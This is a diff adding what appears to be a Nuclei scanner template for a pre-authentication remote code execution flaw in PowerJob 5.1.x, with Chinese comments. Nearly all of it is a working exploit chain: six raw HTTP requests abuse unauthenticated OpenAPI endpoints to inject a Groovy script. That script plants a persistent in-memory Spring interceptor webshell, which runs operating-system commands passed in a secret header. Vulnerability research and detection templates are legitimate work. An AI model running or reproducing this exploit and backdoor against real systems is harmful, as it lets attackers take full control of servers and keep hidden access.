@@ -1,0 +1,155 @@
+id: powerjob-preauth-groovy-memshell-rce
+
+info:
+  name: PowerJob v5.1.x - Pre-Auth Groovy Memshell Injection (RCE)
+  author: security-research
+  severity: critical
+  description: |
+    PowerJob v5.1.0~v5.1.2 的 OpenAPI 接口无需鉴权，攻击者可通过创建
+    Workflow DECISION 节点注入 Groovy 脚本，向 Spring adaptedInterceptors
+    列表植入恶意 HandlerInterceptor 内存马，实现任意命令执行。
+  reference:
+    - https://github.com/PowerJob/PowerJob/issues/1168
+  tags: powerjob,rce,pre-auth,groovy,memshell,spring
+
+variables:
+  app_id: "1"
+  shell_header: "{{rand_base(8)}}"
+  rand_num: "{{rand_int(100000000, 999999999)}}"
+
+http:
+  - raw:
+      # ----------------------------------------------------------------
+      # REQ 1: 探测 appId 是否有效
+      # ----------------------------------------------------------------
+      - |
+        POST /openApi/fetchAllJob?appId={{app_id}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+      # ----------------------------------------------------------------
+      # REQ 2: 创建虚拟 Job → 提取 job_id
+      # ----------------------------------------------------------------
+      - |
+        POST /openApi/saveJob HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"appId":{{app_id}},"jobName":"memshell_dummy_{{rand_base(4)}}","jobDescription":"dummy","jobParams":"","timeExpressionType":"API","executeType":"STANDALONE","processorType":"BUILT_IN","processorInfo":"tech.powerjob.official.processors.impl.script.ShellProcessor","maxInstanceNum":0,"concurrency":5,"instanceTimeLimit":0,"instanceRetryNum":0,"taskRetryNum":0,"enable":true}
+
+      # ----------------------------------------------------------------
+      # REQ 3: 创建3个工作流节点 (DECISION + true_branch + false_branch)
+      #         → 分别提取 decision_node_id / true_branch_id / false_branch_id
+      # ----------------------------------------------------------------
+      - |
+        POST /openApi/addWorkflowNode HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        [{"appId":{{app_id}},"type":2,"nodeName":"memshell_decision","nodeParams":"import java.lang.reflect.Field\ndef cl = Thread.currentThread().getContextClassLoader()\ndef springAppClass = cl.loadClass(\"org.springframework.boot.SpringApplication\")\ndef shutdownHookField = springAppClass.getDeclaredField(\"shutdownHook\")\nshutdownHookField.setAccessible(true)\ndef hookObj = shutdownHookField.get(null)\ndef contextsField = hookObj.getClass().getDeclaredField(\"contexts\")\ncontextsField.setAccessible(true)\ndef contexts = contextsField.get(hookObj)\nif (contexts == null || contexts.isEmpty()) { return false }\ndef context = contexts.iterator().next()\ndef mappingHandler = context.getBean(\"requestMappingHandlerMapping\")\ndef field = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMapping\").getDeclaredField(\"adaptedInterceptors\")\nfield.setAccessible(true)\ndef interceptors = (java.util.List) field.get(mappingHandler)\ninterceptors.removeIf { it.toString().contains(\"memshell\") }\ndef shellInterceptor = new org.springframework.web.servlet.HandlerInterceptor() {\n  @Override\n  boolean preHandle(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response, Object handler) throws Exception {\n    String cmd = request.getHeader(\"{{shell_header}}\")\n    if (cmd != null && !cmd.isEmpty()) {\n      try {\n        String os = System.getProperty(\"os.name\").toLowerCase()\n        String[] cmds\n        if (os.contains(\"win\")) { cmds = [\"cmd.exe\", \"/c\", cmd] as String[] } else { cmds = [\"/bin/sh\", \"-c\", cmd] as String[] }\n        def process = Runtime.getRuntime().exec(cmds)\n        def inputStream = process.getInputStream()\n        def errStream = process.getErrorStream()\n        def outBuf = new java.io.ByteArrayOutputStream()\n        def errBuf = new java.io.ByteArrayOutputStream()\n        def buf = new byte[4096]; int len\n        while ((len = inputStream.read(buf)) != -1) { outBuf.write(buf, 0, len) }\n        while ((len = errStream.read(buf)) != -1) { errBuf.write(buf, 0, len) }\n        process.waitFor()\n        response.setStatus(200)\n        response.setContentType(\"text/plain;charset=UTF-8\")\n        response.setHeader(\"X-Shell-Status\", \"active\")\n        def writer = response.getWriter()\n        writer.write(outBuf.toString(\"UTF-8\"))\n        if (errBuf.size() > 0) { writer.write(\"\\n--- STDERR ---\\n\"); writer.write(errBuf.toString(\"UTF-8\")) }\n        writer.flush()\n        writer.close()\n      } catch (Exception e) { response.setContentType(\"text/plain;charset=UTF-8\"); response.getWriter().write(\"Error: \" + e.getMessage()); response.getWriter().flush() }\n      return false\n    }\n    return true\n  }\n  @Override\n  String toString() { return \"memshell-interceptor\" }\n}\ninterceptors.add(0, shellInterceptor)\nreturn true","enable":true,"skipWhenFailed":false},{"appId":{{app_id}},"type":1,"jobId":{{job_id}},"nodeName":"true_branch","enable":true,"skipWhenFailed":false},{"appId":{{app_id}},"type":1,"jobId":{{job_id}},"nodeName":"false_branch","enable":true,"skipWhenFailed":false}]
+
+
+      # ----------------------------------------------------------------
+      # REQ 4: 创建 DAG 工作流（包含完整3节点 + 2条出边）
+      #         DECISION 节点 out-degree 必须=2，即必须有 true/false 两条出边
+      #         → 提取 workflow_id
+      # ----------------------------------------------------------------
+      - |
+        POST /openApi/saveWorkflow HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"appId":{{app_id}},"wfName":"memshell_wf_{{rand_base(4)}}","wfDescription":"PoC","timeExpressionType":"API","maxWfInstanceNum":1,"enable":true,"dag":{"nodes":[{"nodeId":{{decision_node_id}},"nodeType":2,"nodeName":"memshell_decision","nodeParams":"groovy"},{"nodeId":{{true_branch_id}},"nodeType":1,"jobId":{{job_id}},"nodeName":"true_branch"},{"nodeId":{{false_branch_id}},"nodeType":1,"jobId":{{job_id}},"nodeName":"false_branch"}],"edges":[{"from":{{decision_node_id}},"to":{{true_branch_id}},"property":"true"},{"from":{{decision_node_id}},"to":{{false_branch_id}},"property":"false"}]}}
+
+      # ----------------------------------------------------------------
+      # REQ 5: 触发工作流 → 服务端异步执行 Groovy 注入内存马
+      # ----------------------------------------------------------------
+      - |
+        POST /openApi/runWorkflow?workflowId={{workflow_id}}&appId={{app_id}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+      # ----------------------------------------------------------------
+      # REQ 6: 等待后验证 (echo 随机数，精确匹配回显)
+      #         建议配合 -delay 8 运行
+      # ----------------------------------------------------------------
+      - |
+        POST /openApi/fetchAllJob?appId={{app_id}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        {{shell_header}}: echo {{rand_num}}
+
+    # ================================================================
+    # 变量提取 (所有 extractors 在每个响应上依次运行，结果向后传递)
+    # ================================================================
+    extractors:
+      # REQ 2 → job_id: 匹配顶层 "data": <数字>
+      - type: regex
+        name: job_id
+        part: body
+        regex:
+          - '"success"\s*:\s*true\s*,\s*"data"\s*:\s*([0-9]+)'
+        group: 1
+        internal: true
+
+      # REQ 3 → decision_node_id: 通过 nodeName 精确匹配，避免被 fetchAllJob 的 job 列表污染
+      - type: regex
+        name: decision_node_id
+        part: body
+        regex:
+          - '"id"\s*:\s*([0-9]+)[^}]*"nodeName"\s*:\s*"memshell_decision"'
+        group: 1
+        internal: true
+
+      # REQ 3 → true_branch_id: 通过 nodeName 精确匹配
+      - type: regex
+        name: true_branch_id
+        part: body
+        regex:
+          - '"id"\s*:\s*([0-9]+)[^}]*"nodeName"\s*:\s*"true_branch"'
+        group: 1
+        internal: true
+
+      # REQ 3 → false_branch_id: 通过 nodeName 精确匹配
+      - type: regex
+        name: false_branch_id
+        part: body
+        regex:
+          - '"id"\s*:\s*([0-9]+)[^}]*"nodeName"\s*:\s*"false_branch"'
+        group: 1
+        internal: true
+
+      # REQ 4 → workflow_id: 匹配 saveWorkflow 响应的顶层 "data": <数字>
+      # 注意: workflow_id 提取器必须放在 job_id 之后，后者会被此结果覆盖
+      - type: regex
+        name: workflow_id
+        part: body
+        regex:
+          - '"success"\s*:\s*true\s*,\s*"data"\s*:\s*([0-9]+)'
+        group: 1
+        internal: true
+
+      # REQ 6 → 回显内容（展示在结果中）
+      - type: regex
+        name: rce_output
+        part: body
+        regex:
+          - "{{rand_num}}"
+
+    # ================================================================
+    # 最终判定：基于 REQ 5 和 REQ 6 的响应，两者都满足才上报
+    # ================================================================
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      # REQ 5 工作流触发成功
+      - type: dsl
+        dsl:
+          - 'contains(body_5, "\"success\":true")'
+        name: workflow-triggered
+
+      # REQ 6 命令回显随机数 → 内存马 RCE 确认
+      - type: dsl
+        dsl:
+          - 'contains(body_6, "{{rand_num}}")'
+        name: memshell-rce-confirmed
